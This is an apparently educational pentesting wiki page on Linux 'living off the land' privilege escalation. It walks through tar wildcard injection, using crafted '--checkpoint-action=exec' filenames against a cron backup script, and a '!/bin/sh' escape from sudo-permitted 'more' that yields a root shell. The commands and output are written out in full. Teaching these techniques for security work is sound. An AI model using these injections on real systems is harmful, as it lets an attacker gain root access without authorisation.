---
authors: ShutdownRepo, p0dalirius
category: infra
---

# 🛠️ Living off the land

## Theory

Living of the Land is a well known privilege escalation technique, where an attacker will leverage binaries found on the attacked machine to perform a privilege escalation. Indeed, many UNIX programs have options that can be exploited to open a shell. Therefore if we can start the program we exploit as another user, we might be able to open a shell as this user ! 

Most of the payloads to do this on UNIX programs can be found on [gtfobins.github.io](https://gtfobins.github.io/).

## Practice

Here are two case study to better understand the principle of these privilege escalations :

### Case study 1 : Privesc using tar and a cronjob

Imagine a scenario where a script backups a directory (that we can control) on the server each hour using `tar` like this :

```
#!/bin/bash

mkdir -p /backups/
cd /var/www/html/ && tar cvzf /backups/backup_$(date +%Y_%m_%d_%Hh%M).tar.gz *
```

Notice this interesting pattern `tar czvf file.tar.gz *` in the script. This is a security vulnerability because of how UNIX shells handles wildcards. Let's see an example with the `ls` command :

```
$ ls -lha
total 84K
drwxrwxr-x 2 user user 4,0K avril 27 22:32 .
drwxrwxrwt 89 user user 76K avril 27 22:31 ..
-rw-rw-r-- 1 user user 0 avril 27 22:31 file1
-rw-rw-r-- 1 user user 0 avril 27 22:31 file2
-rw-rw-r-- 1 user user 0 avril 27 22:31 file3
$ ls *
file1 file2 file3

$ echo '' > '-lha'
$ ls -lha 
total 88K
drwxrwxr-x 2 user user 4,0K avril 27 22:32 .
drwxrwxrwt 89 user user 76K avril 27 22:31 ..
-rw-rw-r-- 1 user user 0 avril 27 22:31 file1
-rw-rw-r-- 1 user user 0 avril 27 22:31 file2
-rw-rw-r-- 1 user user 0 avril 27 22:31 file3
-rw-rw-r-- 1 user user 1 avril 27 22:32 -lha
$ ls *
-rw-rw-r-- 1 user user 0 avril 27 22:31 file1
-rw-rw-r-- 1 user user 0 avril 27 22:31 file2
-rw-rw-r-- 1 user user 0 avril 27 22:31 file3
```

The shell wildcards are resolved by the shell, and not by the command. This means filenames can be treated as options if they are starting with a `-`. In our previous example, we added a file called `-lha` into the folder. When we type `ls *`, the shell replaces the `*` by all matching files in the current directory, and therefore our command becomes `ls file1 file2 file3 -lha`. After the wildcard resolution, the shell executes the command with our options.

Now if we get back to our script creating a backup of a directory each our with `tar *`, we see that tar have legitimate options allowing execution of a program. You can find them here :

* [https://gtfobins.github.io/gtfobins/tar/#shell](https://gtfobins.github.io/gtfobins/tar/#shell)

To use these options in our exploit, we jut need to create these two files in our directory, as well as the `exploit.sh` file, containing the command we want to run when we trigger the execution :

```
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh exploit.sh'

$ ls -lha 
total 88K
drwxrwxr-x 2 user user 4,0K avril 27 22:32 .
drwxrwxrwt 89 user user 76K avril 27 22:31 ..
-rw-rw-r-- 1 user user 0 avril 27 22:31 file1
-rw-rw-r-- 1 user user 0 avril 27 22:31 file2
-rw-rw-r-- 1 user user 1 avril 27 22:31 '--checkpoint=1'
-rw-rw-r-- 1 user user 1 avril 27 22:32 '--checkpoint-action=exec=sh exploit.sh'
-rwxrwxrwx 1 user user 784 avril 27 22:32 exploit.sh
```

We are now ready ! We just need to wait until the directory is backup again, and it will trigger our payload and execute `exploit.sh` file!

### Case study 2 : Privesc using more and sudo

Let's take an example, with this `sudo` configuration :

```
$ sudo -l
[sudo] password for user: 
Matching Defaults entries for user on PC1:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on PC1:
 (ALL : NOPASSWD) /usr/bin/more /var/log/apache2/access.log
```

In this case `user` can run the `more` command, but only to read a specific log file `/var/log/apache2/access.log` as `root` without password (`NOPASSWD` flag) : 

```
sudo -u root /usr/bin/more /var/log/apache2/access.log
```

You can assume this would be safe right ? Unfortunately, it's not. The `more` command has various useful options, one of them is `!`. When you're in `more` and you type an exclamation mark followed by the path to a binary file, you can execute it in a subprocess. For example if you type `!/bin/sh` in `more`, you will open a shell as the owner of the parent `more` process !

```
$ sudo -u root /usr/bin/more /var/log/apache2/access.log
File content line 1
File content line 2
...
File content line n
------------------------
!/bin/sh
# 
uid=0(root) gid=0(root) groups=0(root)
# 
```